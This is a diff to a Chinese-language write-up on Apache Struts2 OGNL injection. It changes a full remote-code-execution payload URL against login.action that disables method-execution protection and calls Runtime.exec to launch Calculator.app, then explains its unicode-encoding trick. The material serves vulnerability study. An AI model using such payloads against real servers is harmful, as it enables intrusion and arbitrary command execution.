@@ -111,7 +111,7 @@ Object o = Ognl.parseExpression("(@java.lang.Runtime@getRuntime().exec('open -a 
 得到最终payload了
 
 ```java
-http://127.0.0.1:8080/login.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(su18)(su19)&('\u0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('y4tacker')
+http://127.0.0.1:8080/login.action?(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(abc)(def)&('\u0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('y4tacker')
 ```
 
 这里你可能会好奇为什么我的payload这个`@`符号明明没有在被过滤但是也用了`unicode`编码，这里的迭代器是来源于`TreeMap`是有序的
